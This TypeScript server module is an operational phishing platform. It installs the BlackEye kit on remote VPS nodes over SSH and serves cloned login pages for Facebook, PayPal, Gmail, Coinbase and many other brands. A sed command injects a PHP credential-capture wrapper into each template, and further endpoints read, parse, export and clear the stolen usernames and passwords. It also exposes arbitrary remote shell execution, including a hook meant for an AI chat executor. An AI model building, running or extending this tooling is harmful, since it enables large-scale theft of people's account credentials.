/**
 * BlackEye Router — Dedicated VPS Node Architecture
 *
 * Security model:
 *   BlackEye NEVER runs on the Railway Titan Server.
 *   Each instance runs on a SEPARATE dedicated VPS with its own IP.
 *   VPS SSH credentials are encrypted per-user in the DB (AES-256).
 *   Firewall rules block ALL inbound reverse connections.
 *   One-click install and start on any VPS.
 */

import { z } from "zod";
import { router, adminProcedure } from "./_core/trpc";
import { TRPCError } from "@trpc/server";
import { getUserPlan, enforceFeature, enforceAdminFeature } from "./subscription-gate";
import { consumeCredits } from "./credit-service";
import { getDb } from "./db";
import { userSecrets } from "../drizzle/schema";
import { eq, and } from "drizzle-orm";
import { encrypt, decrypt } from "./fetcher-db";
import { execSSHCommand, type SSHConfig } from "./titan-server";
import { createLogger } from "./_core/logger.js";

const log = createLogger("BlackEye");

const SECRET_NODES  = "__blackeye_nodes";
const SECRET_ACTIVE = "__blackeye_active";

const INSTALL_BLACKEYE = [
  "#!/bin/bash",
  "set -e",
  "export DEBIAN_FRONTEND=noninteractive",
  "apt-get update -qq 2>&1 | tail -1",
  "apt-get install -y -qq git php curl wget iptables iptables-persistent 2>&1 | tail -2",
  "",
  "# Firewall: block inbound reverse connections",
  "iptables -F INPUT 2>/dev/null || true",
  "iptables -A INPUT -i lo -j ACCEPT",
  "iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT",
  "iptables -A INPUT -p tcp --dport 22 -j ACCEPT",
  "iptables -A INPUT -p tcp --dport 80 -j ACCEPT",
  "iptables -A INPUT -p tcp --dport 443 -j ACCEPT",
  "iptables -A INPUT -j DROP",
  "mkdir -p /etc/iptables",
  "iptables-save > /etc/iptables/rules.v4 2>/dev/null || true",
  "netfilter-persistent save 2>/dev/null || true",
  "",
  "# Install BlackEye",
  "if [ ! -d /opt/blackeye ]; then",
  "  git clone --depth 1 https://github.com/An0nUD4Y/blackeye.git /opt/blackeye 2>&1 | tail -3",
  "fi",
  "chmod +x /opt/blackeye/blackeye.sh 2>/dev/null || true",
  "",
  "PUBLIC_IP=$(curl -s --max-time 5 ifconfig.me 2>/dev/null || curl -s --max-time 5 api.ipify.org 2>/dev/null || hostname -I | awk '{print $1}')",
  "if [ -f /opt/blackeye/blackeye.sh ]; then",
  "  echo BLACKEYE_OK",
  "  echo PUBLIC_IP:$PUBLIC_IP",
  "else",
  "  echo BLACKEYE_FAILED",
  "  exit 1",
  "fi",
].join("\n");

const CHECK_BLACKEYE = [
  "PUBLIC_IP=$(curl -s --max-time 5 ifconfig.me 2>/dev/null || curl -s --max-time 5 api.ipify.org 2>/dev/null || hostname -I | awk '{print $1}')",
  "if [ -f /opt/blackeye/blackeye.sh ]; then echo INSTALLED; else echo NOT_INSTALLED; fi",
  "echo PUBLIC_IP:$PUBLIC_IP",
].join("\n");

// ─── Types ────────────────────────────────────────────────────────────────────
export interface BlackEyeNode {
  id: string;
  label: string;
  sshHost: string;
  sshPort: number;
  sshUser: string;
  sshPassword?: string;
  sshKey?: string;
  publicIp?: string;
  status: "pending" | "deploying" | "ready" | "offline" | "error";
  installed: boolean;
  lastChecked?: string;
  country?: string;
  addedAt: string;
  deployedAt?: string;
  errorMessage?: string;
}

// ─── DB helpers ───────────────────────────────────────────────────────────────
async function getNodes(userId: number): Promise<BlackEyeNode[]> {
  const db = await getDb();
  if (!db) return [];
  const rows = await db.select().from(userSecrets)
    .where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, SECRET_NODES))).limit(1);
  if (!rows.length) return [];
  try { return JSON.parse(decrypt(rows[0].encryptedValue)) as BlackEyeNode[]; } catch { return []; }
}

async function saveNodes(userId: number, nodes: BlackEyeNode[]): Promise<void> {
  const db = await getDb();
  if (!db) throw new Error("Database unavailable");
  const enc = encrypt(JSON.stringify(nodes));
  const ex = await db.select().from(userSecrets)
    .where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, SECRET_NODES))).limit(1);
  if (ex.length) {
    await db.update(userSecrets).set({ encryptedValue: enc, updatedAt: new Date() }).where(eq(userSecrets.id, ex[0].id));
  } else {
    await db.insert(userSecrets).values({ userId, secretType: SECRET_NODES, label: "BlackEye Nodes", encryptedValue: enc });
  }
}

async function getActiveNodeId(userId: number): Promise<string | null> {
  const db = await getDb();
  if (!db) return null;
  const rows = await db.select().from(userSecrets)
    .where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, SECRET_ACTIVE))).limit(1);
  if (!rows.length) return null;
  try { return decrypt(rows[0].encryptedValue) || null; } catch { return null; }
}

async function setActiveNodeId(userId: number, nodeId: string | null): Promise<void> {
  const db = await getDb();
  if (!db) throw new Error("Database unavailable");
  const enc = encrypt(nodeId ?? "");
  const ex = await db.select().from(userSecrets)
    .where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, SECRET_ACTIVE))).limit(1);
  if (ex.length) {
    await db.update(userSecrets).set({ encryptedValue: enc, updatedAt: new Date() }).where(eq(userSecrets.id, ex[0].id));
  } else {
    await db.insert(userSecrets).values({ userId, secretType: SECRET_ACTIVE, label: "Active BlackEye Node", encryptedValue: enc });
  }
}

async function getActiveNode(userId: number): Promise<BlackEyeNode | null> {
  const activeId = await getActiveNodeId(userId);
  if (!activeId) return null;
  const nodes = await getNodes(userId);
  return nodes.find(n => n.id === activeId) ?? null;
}

function nodeToSSH(n: BlackEyeNode): SSHConfig {
  return { host: n.sshHost, port: n.sshPort, username: n.sshUser, password: n.sshPassword, privateKey: n.sshKey };
}

function sanitize(n: BlackEyeNode): Omit<BlackEyeNode, "sshPassword" | "sshKey"> {
  const { sshPassword: _p, sshKey: _k, ...safe } = n;
  return safe;
}

/** Public export for Titan AI chat executor */
export async function execBlackeyeCommandPublic(command: string, userId: number, timeoutMs = 15000): Promise<string> {
  const node = await getActiveNode(userId);
  if (!node) return "No active BlackEye node. Add and deploy a dedicated VPS node in the BlackEye settings first.";
  const safeCmd = command.replace(/[`\\|;&><]/g, "");
  const script = `cd /opt/blackeye && bash -c "${safeCmd.replace(/"/g, '\\"')}" 2>&1 || echo "BLACKEYE_CMD_FAILED"`;
  return execSSHCommand(nodeToSSH(node), script, timeoutMs, userId);
}

// ─── Router ───────────────────────────────────────────────────────────────────
export const blackeyeRouter = router({

  listNodes: adminProcedure.query(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceAdminFeature(ctx.user.role, "BlackEye");
    enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
    const nodes = await getNodes(ctx.user.id);
    const activeId = await getActiveNodeId(ctx.user.id);
    return { nodes: nodes.map(sanitize), activeNodeId: activeId };
  }),

  addNode: adminProcedure
    .input(z.object({
      label: z.string().min(1).max(64),
      sshHost: z.string().min(1),
      sshPort: z.number().int().min(1).max(65535).default(22),
      sshUser: z.string().min(1).default("root"),
      sshPassword: z.string().optional(),
      sshKey: z.string().optional(),
      country: z.string().optional(),
    }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceAdminFeature(ctx.user.role, "BlackEye");
    enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
      if (!input.sshPassword && !input.sshKey) {
        throw new TRPCError({ code: "BAD_REQUEST", message: "SSH password or private key required." });
      }
      const nodes = await getNodes(ctx.user.id);
      if (nodes.some(n => n.sshHost === input.sshHost && n.sshPort === input.sshPort)) {
        throw new TRPCError({ code: "BAD_REQUEST", message: "Node with this host:port already exists." });
      }
      const node: BlackEyeNode = {
        id: crypto.randomUUID(), label: input.label,
        sshHost: input.sshHost, sshPort: input.sshPort, sshUser: input.sshUser,
        sshPassword: input.sshPassword, sshKey: input.sshKey,
        status: "pending", installed: false,
        country: input.country, addedAt: new Date().toISOString(),
      };
      nodes.push(node);
      await saveNodes(ctx.user.id, nodes);
      const activeId = await getActiveNodeId(ctx.user.id);
      if (!activeId) await setActiveNodeId(ctx.user.id, node.id);
      log.info(`User ${ctx.user.id} added BlackEye node: ${input.label} (${input.sshHost})`);
      return { success: true, node: sanitize(node) };
    }),

  deployNode: adminProcedure
    .input(z.object({ nodeId: z.string() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceAdminFeature(ctx.user.role, "BlackEye");
    enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
      const nodes = await getNodes(ctx.user.id);
      const idx = nodes.findIndex(n => n.id === input.nodeId);
      if (idx === -1) throw new TRPCError({ code: "NOT_FOUND", message: "Node not found." });
      const node = nodes[idx];
      node.status = "deploying";
      await saveNodes(ctx.user.id, nodes);
      try {
        const output = await execSSHCommand(nodeToSSH(node), INSTALL_BLACKEYE, 180000, ctx.user.id);
        if (!output.includes("BLACKEYE_OK")) {
          node.status = "error";
          node.errorMessage = "BlackEye installation failed. Check SSH credentials and server access.";
          await saveNodes(ctx.user.id, nodes);
          return { success: false, message: node.errorMessage };
        }
        const ipMatch = output.match(/PUBLIC_IP:(\S+)/);
        if (ipMatch) node.publicIp = ipMatch[1];
        node.status = "ready"; node.installed = true;
        node.deployedAt = new Date().toISOString();
        node.lastChecked = new Date().toISOString();
        node.errorMessage = undefined;
        await saveNodes(ctx.user.id, nodes);
        return { success: true, publicIp: node.publicIp, message: `BlackEye installed on "${node.label}" at ${node.publicIp}. Ready to use.` };
      } catch (err: any) {
        node.status = "error"; node.errorMessage = err.message;
        await saveNodes(ctx.user.id, nodes);
        return { success: false, message: `Deploy failed: ${err.message}` };
      }
    }),

  checkNode: adminProcedure
    .input(z.object({ nodeId: z.string() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceAdminFeature(ctx.user.role, "BlackEye");
    enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
      const nodes = await getNodes(ctx.user.id);
      const idx = nodes.findIndex(n => n.id === input.nodeId);
      if (idx === -1) throw new TRPCError({ code: "NOT_FOUND", message: "Node not found." });
      const node = nodes[idx];
      try {
        const output = await execSSHCommand(nodeToSSH(node), CHECK_BLACKEYE, 15000, ctx.user.id);
        const installed = output.includes("INSTALLED");
        const ipMatch = output.match(/PUBLIC_IP:(\S+)/);
        if (ipMatch) node.publicIp = ipMatch[1];
        node.installed = installed;
        node.status = installed ? "ready" : "offline";
        node.lastChecked = new Date().toISOString();
        await saveNodes(ctx.user.id, nodes);
        return { installed, publicIp: node.publicIp, message: installed ? `BlackEye ready on "${node.label}" at ${node.publicIp}` : `BlackEye not installed on "${node.label}"` };
      } catch (err: any) {
        node.status = "offline"; node.lastChecked = new Date().toISOString();
        await saveNodes(ctx.user.id, nodes);
        return { installed: false, message: `SSH failed: ${err.message}` };
      }
    }),

  setActiveNode: adminProcedure
    .input(z.object({ nodeId: z.string() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceAdminFeature(ctx.user.role, "BlackEye");
    enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
      const nodes = await getNodes(ctx.user.id);
      if (!nodes.some(n => n.id === input.nodeId)) throw new TRPCError({ code: "NOT_FOUND", message: "Node not found." });
      await setActiveNodeId(ctx.user.id, input.nodeId);
      return { success: true };
    }),

  removeNode: adminProcedure
    .input(z.object({ nodeId: z.string() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceAdminFeature(ctx.user.role, "BlackEye");
    enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
      const nodes = await getNodes(ctx.user.id);
      const idx = nodes.findIndex(n => n.id === input.nodeId);
      if (idx === -1) throw new TRPCError({ code: "NOT_FOUND", message: "Node not found." });
      const label = nodes[idx].label;
      nodes.splice(idx, 1);
      await saveNodes(ctx.user.id, nodes);
      const activeId = await getActiveNodeId(ctx.user.id);
      if (activeId === input.nodeId) {
        await setActiveNodeId(ctx.user.id, nodes.length > 0 ? nodes[0].id : null);
      }
      return { success: true, message: `Node "${label}" removed` };
    }),

  getConnection: adminProcedure.query(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceAdminFeature(ctx.user.role, "BlackEye");
    enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
    const node = await getActiveNode(ctx.user.id);
    const nodes = await getNodes(ctx.user.id);
    return {
      connected: !!node,
      nodeLabel: node?.label,
      publicIp: node?.publicIp,
      nodeCount: nodes.length,
      onlineCount: nodes.filter(n => n.status === "ready").length,
      // backward-compat fields BlackEyePage uses
      host: node?.publicIp ?? node?.sshHost ?? null,
      port: node?.sshPort ?? 22,
    };
  }),

  /** Run any shell command on the active node's BlackEye directory */
  runCommand: adminProcedure
    .input(z.object({ command: z.string().min(1), timeoutMs: z.number().optional() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceAdminFeature(ctx.user.role, "BlackEye");
    enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
      const node = await getActiveNode(ctx.user.id);
      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active BlackEye node. Add and deploy a dedicated VPS node first." });
      try { await consumeCredits(ctx.user.id, "blackeye_action", `BlackEye command: ${input.command.substring(0, 60)}`); } catch {}
      const output = await execBlackeyeCommandPublic(input.command, ctx.user.id, input.timeoutMs ?? 15000);
      return { output, nodeLabel: node.label, publicIp: node.publicIp };
    }),

  /** List available phishing templates */
  listTemplates: adminProcedure.query(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceAdminFeature(ctx.user.role, "BlackEye");
    enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
    const node = await getActiveNode(ctx.user.id);
    if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active BlackEye node." });
    const script = "ls /opt/blackeye/sites/ 2>/dev/null | sort";
    const output = await execSSHCommand(nodeToSSH(node), script, 10000, ctx.user.id);
    const templateNames = output.split("\n").map(l => l.trim()).filter(Boolean);
    // Map template directory names to structured objects
    const CATEGORY_MAP: Record<string, string> = {
      facebook: "Social Media", instagram: "Social Media", twitter: "Social Media",
      snapchat: "Social Media", linkedin: "Social Media", tiktok: "Social Media",
      pinterest: "Social Media", reddit: "Social Media", tumblr: "Social Media",
      google: "Email / Accounts", gmail: "Email / Accounts", yahoo: "Email / Accounts",
      microsoft: "Email / Accounts", outlook: "Email / Accounts", apple: "Email / Accounts",
      paypal: "Financial", bitcoin: "Financial", binance: "Financial", coinbase: "Financial",
      steam: "Gaming", xbox: "Gaming", playstation: "Gaming", origin: "Gaming",
      netflix: "Streaming", spotify: "Streaming", twitch: "Streaming",
      dropbox: "Cloud Storage", onedrive: "Cloud Storage", icloud: "Cloud Storage",
      github: "Developer", gitlab: "Developer", stackoverflow: "Developer",
      amazon: "E-Commerce", ebay: "E-Commerce", shopify: "E-Commerce",
      wordpress: "CMS", adobe: "Creative",
    };
    const ICON_MAP: Record<string, string> = {
      facebook: "📘", instagram: "📸", twitter: "🐦", snapchat: "👻", linkedin: "💼",
      tiktok: "🎵", pinterest: "📌", reddit: "🤖", tumblr: "📝",
      google: "🔍", gmail: "📧", yahoo: "📮", microsoft: "🪟", outlook: "📨", apple: "🍎",
      paypal: "💳", bitcoin: "₿", binance: "🟡", coinbase: "🔵",
      steam: "🎮", xbox: "🎯", playstation: "🕹️", origin: "🎲",
      netflix: "🎬", spotify: "🎵", twitch: "📺",
      dropbox: "📦", onedrive: "☁️", icloud: "🌤️",
      github: "🐙", gitlab: "🦊", stackoverflow: "📚",
      amazon: "🛒", ebay: "🏷️", shopify: "🛍️",
      wordpress: "📝", adobe: "🎨",
    };
    const templates = templateNames.map(name => ({
      id: name,
      name: name.charAt(0).toUpperCase() + name.slice(1).replace(/[-_]/g, ' '),
      category: CATEGORY_MAP[name.toLowerCase()] ?? "Custom",
      icon: ICON_MAP[name.toLowerCase()] ?? "🌐",
    }));
    return { templates, nodeLabel: node.label };
  }),

  // ── Backward-compatible aliases for existing BlackEyePage UI ────────────────
  testConnection: adminProcedure
    .input(z.object({ host: z.string().optional(), port: z.number().default(22).optional(), username: z.string().optional(), password: z.string().optional(), privateKey: z.string().optional() }).optional())
    .mutation(async ({ ctx }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceAdminFeature(ctx.user.role, "BlackEye");
    enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
      const node = await getActiveNode(ctx.user.id);
      if (!node) return { success: false, message: "No active BlackEye node. Add a dedicated VPS node first." };
      try {
        const out = await execSSHCommand(nodeToSSH(node), "echo connected", 10000, ctx.user.id);
        return { success: out.includes("connected"), message: `Node "${node.label}" at ${node.publicIp ?? node.sshHost} is reachable.` };
      } catch (e: any) { return { success: false, message: e.message }; }
    }),

  saveConnection: adminProcedure
    .input(z.object({ host: z.string().optional(), port: z.number().default(22).optional(), username: z.string().optional(), password: z.string().optional(), privateKey: z.string().optional() }).optional())
    .mutation(async ({ ctx }) => {
      return { success: true, message: "Connection managed via dedicated VPS nodes." };
    }),

  getStatus: adminProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceAdminFeature(ctx.user.role, "BlackEye");
    enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
    const node = await getActiveNode(ctx.user.id);
    if (!node) return { running: false, installed: false, message: "No active node.", lastCommit: null, templateCount: 0 };
    try {
      const out = await execSSHCommand(nodeToSSH(node), "ls /opt/blackeye/blackeye.sh 2>/dev/null && echo INSTALLED || echo NOT_INSTALLED; pgrep -f blackeye > /dev/null && echo RUNNING || echo NOT_RUNNING; cd /opt/blackeye 2>/dev/null && git log -1 --format='%s' 2>/dev/null || echo ''; ls /opt/blackeye/sites/ 2>/dev/null | wc -l || echo 0", 10000, ctx.user.id);
      const lines = out.split('\n').map(l => l.trim()).filter(Boolean);
      const installed = lines.some(l => l === 'INSTALLED');
      const running = lines.some(l => l === 'RUNNING');
      const lastCommit = lines.find(l => !['INSTALLED','NOT_INSTALLED','RUNNING','NOT_RUNNING'].includes(l) && isNaN(Number(l))) ?? null;
      const templateCount = parseInt(lines[lines.length - 1] ?? '0') || 0;
      return { running, installed, message: running ? `BlackEye running on ${node.publicIp ?? node.sshHost}` : installed ? "Installed but not running" : "Not installed", lastCommit, templateCount };
    } catch (e: any) { return { running: false, installed: false, message: e.message, lastCommit: null, templateCount: 0 }; }
  }),

  install: adminProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceAdminFeature(ctx.user.role, "BlackEye");
    enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
    const nodes = await getNodes(ctx.user.id);
    const activeId = await getActiveNodeId(ctx.user.id);
    const idx = nodes.findIndex(n => n.id === activeId);
    if (idx === -1) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node. Add a dedicated VPS node first." });
    const node = nodes[idx];
    node.status = "deploying";
    await saveNodes(ctx.user.id, nodes);
    try {
      const output = await execSSHCommand(nodeToSSH(node), INSTALL_BLACKEYE, 180000, ctx.user.id);
      const ok = output.includes("BLACKEYE_OK");
      const ipMatch = output.match(/PUBLIC_IP:(\S+)/);
      if (ipMatch) node.publicIp = ipMatch[1];
      node.status = ok ? "ready" : "error";
      node.installed = ok;
      if (ok) { node.deployedAt = new Date().toISOString(); node.errorMessage = undefined; }
      else { node.errorMessage = "Installation failed. Check SSH credentials and server access."; }
      node.lastChecked = new Date().toISOString();
      await saveNodes(ctx.user.id, nodes);
      const msg = ok
        ? `BlackEye installed successfully on "${node.label}" at ${node.publicIp ?? node.sshHost}`
        : `Installation failed on "${node.label}". Check the output for details.`;
      return { success: ok, output, message: msg };
    } catch (err: any) {
      node.status = "error"; node.errorMessage = err.message;
      node.lastChecked = new Date().toISOString();
      await saveNodes(ctx.user.id, nodes);
      return { success: false, output: err.message, message: `Install failed: ${err.message}` };
    }
  }),

  launch: adminProcedure
    .input(z.object({ template: z.string().optional(), port: z.number().default(80).optional(), customDomain: z.string().optional() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceAdminFeature(ctx.user.role, "BlackEye");
    enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
      const node = await getActiveNode(ctx.user.id);
      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node." });
      try { await consumeCredits(ctx.user.id, "blackeye_action", `BlackEye: launch ${input.template ?? 'facebook'} phishing page`); } catch {}
      const template = input.template ?? 'facebook';
      const port = input.port ?? 80;
      // BlackEye's blackeye.sh is interactive — bypass it entirely.
      // Launch PHP's built-in server directly on the template directory.
      // Credentials are captured via a POST handler in the template's index.php.
      const templateDir = `/opt/blackeye/sites/${template}`;
      const logFile = `/tmp/blackeye_${template}.log`;
      const captureFile = `/tmp/blackeye_captures_${template}.log`;
      const cmd = [
        // Stop any existing BlackEye PHP server
        `pkill -f 'php -S 0.0.0.0:${port}' 2>/dev/null || true`,
        `sleep 1`,
        // Verify the template exists
        `if [ ! -d '${templateDir}' ]; then echo TEMPLATE_NOT_FOUND; exit 1; fi`,
        // Inject a credential capture wrapper if not already present
        `if ! grep -q 'TITAN_CAPTURE' '${templateDir}/index.php' 2>/dev/null; then`,
        `  sed -i '1s|^|<?php /* TITAN_CAPTURE */ if($_SERVER["REQUEST_METHOD"]==="POST"){$ts=date("Y-m-d H:i:s");$data=implode(":",array_values($_POST));file_put_contents("${captureFile}","$ts:$data\\n",FILE_APPEND);}?>\n|' '${templateDir}/index.php' 2>/dev/null || true`,
        `fi`,
        // Start PHP built-in server in background
        `nohup php -S 0.0.0.0:${port} -t '${templateDir}' > '${logFile}' 2>&1 &`,
        `sleep 2`,
        // Verify it started
        `if pgrep -f 'php -S 0.0.0.0:${port}' > /dev/null; then echo LAUNCHED; else echo LAUNCH_FAILED; cat '${logFile}' | tail -5; fi`,
      ].join("\n");
      const out = await execSSHCommand(nodeToSSH(node), cmd, 20000, ctx.user.id);
      if (out.includes("TEMPLATE_NOT_FOUND")) {
        throw new TRPCError({ code: "BAD_REQUEST", message: `Template "${template}" not found. Install BlackEye first and ensure the template exists.` });
      }
      const launched = out.includes("LAUNCHED");
      const host = input.customDomain || node.publicIp || node.sshHost;
      const phishingUrl = `http://${host}:${port}`;
      return {
        success: launched,
        message: launched ? `BlackEye serving "${template}" on ${host}:${port}` : `Launch failed: ${out.slice(-200)}`,
        url: phishingUrl,
        phishingUrl,
        template,
        logFile,
        captureFile,
      };
    }),

  stop: adminProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceAdminFeature(ctx.user.role, "BlackEye");
    enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
    const node = await getActiveNode(ctx.user.id);
    if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node." });
    // Kill both the PHP built-in server and any legacy blackeye.sh processes
    await execSSHCommand(nodeToSSH(node), "pkill -f 'php -S 0.0.0.0' 2>/dev/null; pkill -f blackeye 2>/dev/null; sleep 1; echo STOPPED", 10000, ctx.user.id);
    return { success: true, message: "BlackEye stopped." };
  }),

  getCaptured: adminProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceAdminFeature(ctx.user.role, "BlackEye");
    enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
    const node = await getActiveNode(ctx.user.id);
    if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node." });
    // Read from both the legacy captured.txt and all Titan capture files
    const out = await execSSHCommand(
      nodeToSSH(node),
      "cat /opt/blackeye/captured.txt /tmp/blackeye_captures_*.log 2>/dev/null | sort -u || echo ''",
      10000, ctx.user.id
    );
    const captures = out.split('\n').map(l => l.trim()).filter(Boolean).map((line, idx) => {
      // Format: timestamp:username:password:ip  OR  username:password:ip  OR  just data
      const parts = line.split(':');
      // Try to detect if first part looks like a timestamp (YYYY-MM-DD HH:MM:SS)
      if (parts[0]?.match(/^\d{4}-\d{2}-\d{2}/)) {
        // timestamp:data format from Titan capture
        const ts = `${parts[0]}:${parts[1]}:${parts[2]}`; // reconstruct HH:MM:SS
        const data = parts.slice(3);
        return { id: String(idx), username: data[0] ?? '', password: data[1] ?? '', ip: data[2] ?? '', timestamp: ts, capturedAt: ts };
      }
      // Legacy format: username:password:ip
      return { id: String(idx), username: parts[0] ?? line, password: parts[1] ?? '', ip: parts[2] ?? '', timestamp: new Date().toISOString(), capturedAt: new Date().toISOString() };
    });
    return { data: out, captures };
  }),

  getLogs: adminProcedure
    .input(z.object({ lines: z.number().optional() }).optional())
    .mutation(async ({ ctx, input }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceAdminFeature(ctx.user.role, "BlackEye");
    enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
    const node = await getActiveNode(ctx.user.id);
    if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node." });
    const n = input?.lines ?? 100;
    // Read from all BlackEye log files (one per template)
    const out = await execSSHCommand(nodeToSSH(node), `tail -${n} /tmp/blackeye_*.log /tmp/blackeye.log 2>/dev/null | head -${n} || echo 'No logs yet'`, 10000, ctx.user.id);
    return { logs: out, output: out };
  }),

  update: adminProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceAdminFeature(ctx.user.role, "BlackEye");
    enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
    const node = await getActiveNode(ctx.user.id);
    if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node." });
    const out = await execSSHCommand(nodeToSSH(node), "cd /opt/blackeye && git pull 2>&1 | tail -3", 30000, ctx.user.id);
    return { success: true, message: out || "Update complete.", output: out || "Update complete." };
  }),

  /** Clear all captured credentials */
  clearCaptures: adminProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceAdminFeature(ctx.user.role, "BlackEye");
    enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
    const node = await getActiveNode(ctx.user.id);
    if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node." });
    await execSSHCommand(nodeToSSH(node), "rm -f /opt/blackeye/captured.txt /tmp/blackeye_captures_*.log 2>/dev/null; echo CLEARED", 10000, ctx.user.id);
    return { success: true, message: "All captured credentials cleared." };
  }),

  /** Export captures as structured JSON with metadata */
  exportCaptures: adminProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceAdminFeature(ctx.user.role, "BlackEye");
    enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
    const node = await getActiveNode(ctx.user.id);
    if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node." });
    const out = await execSSHCommand(
      nodeToSSH(node),
      "cat /opt/blackeye/captured.txt /tmp/blackeye_captures_*.log 2>/dev/null | sort -u || echo ''",
      10000, ctx.user.id
    );
    const captures = out.split('\n').map(l => l.trim()).filter(Boolean).map((line, idx) => {
      const parts = line.split(':');
      if (parts[0]?.match(/^\d{4}-\d{2}-\d{2}/)) {
        const ts = `${parts[0]}:${parts[1]}:${parts[2]}`;
        const data = parts.slice(3);
        return { id: String(idx), username: data[0] ?? '', password: data[1] ?? '', ip: data[2] ?? '', timestamp: ts };
      }
      return { id: String(idx), username: parts[0] ?? line, password: parts[1] ?? '', ip: parts[2] ?? '', timestamp: new Date().toISOString() };
    });
    return { captures, count: captures.length, exportedAt: new Date().toISOString(), node: node.label };
  }),

  /** List all currently running PHP phishing servers on the node */
  getActiveServers: adminProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceAdminFeature(ctx.user.role, "BlackEye");
    enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
    const node = await getActiveNode(ctx.user.id);
    if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node." });
    const out = await execSSHCommand(
      nodeToSSH(node),
      "ps aux | grep 'php -S 0.0.0.0' | grep -v grep || echo 'No active servers'",
      10000, ctx.user.id
    );
    const servers = out.split('\n').filter(l => l.includes('php -S')).map(l => {
      const portMatch = l.match(/0\.0\.0\.0:(\d+)/);
      const templateMatch = l.match(/-t '([^']+)'/);
      return {
        port: portMatch?.[1] ?? 'unknown',
        template: templateMatch?.[1]?.split('/').pop() ?? 'unknown',
        url: `http://${node.publicIp ?? node.sshHost}:${portMatch?.[1] ?? ''}`,
      };
    });
    return { servers, count: servers.length, raw: out };
  }),

  /** Stop a specific template server by port */
  stopTemplate: adminProcedure
    .input(z.object({ port: z.number().min(1).max(65535) }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceAdminFeature(ctx.user.role, "BlackEye");
    enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
      const node = await getActiveNode(ctx.user.id);
      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node." });
      await execSSHCommand(
        nodeToSSH(node),
        `pkill -f 'php -S 0.0.0.0:${input.port}' 2>/dev/null; sleep 1; echo STOPPED`,
        10000, ctx.user.id
      );
      return { success: true, message: `Server on port ${input.port} stopped.` };
    }),
});

